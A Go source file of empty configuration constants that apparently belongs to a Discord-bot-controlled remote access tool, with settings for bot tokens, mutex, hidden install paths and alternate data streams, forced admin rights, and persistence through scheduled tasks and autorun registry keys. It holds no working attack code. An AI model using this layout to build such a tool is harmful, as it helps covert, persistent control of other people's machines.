package store

// misc
const (
	LAUNCH_KEY string = ""

	MUTEX_NAME string = ""

	CRYPTO_KEY_1 string = ""
	CRYPTO_KEY_2 string = ""
)

// bot
const (
	BOT_TOKEN   string = ""
	SERVER_ID   string = ""
	CATEGORY_ID string = ""

	COMMAND_PREFIX string = ""

	TRACKING_ID string = ""

	ADD_BUTTONS bool = false
)

// setup
const (
	USE_CUSTOM_NAME bool   = false
	USE_RANDOM_NAME bool   = false
	CUSTOM_NAME     string = ""

	USE_CUSTOM_DIR bool   = false
	USE_RANDOM_DIR bool   = false
	CUSTOM_DIR     string = ""

	USE_ADS         bool   = false
	CUSTOM_ADS_PATH string = ""

	USE_REGISTRY bool = false
)

// options
const (
	REQUIRE_ADMIN          bool = false
	PROMPT_ADMIN           bool = false
	FORCE_ADMIN            bool = false
	CONTINUE_WITHOUT_ADMIN bool = false

	OPEN_BOT_SOCKET_MAX_RETRIES int  = 20
	OPEN_BOT_SOCKET_DELAY       int  = 15
	EXIT_IF_CANT_CONNECT        bool = false
)

// persistence
const (
	PERSISTENCE_NAME string = ""

	TASK_SCHEDULAR bool = false
	AUTO_RUN_REG   bool = false
)
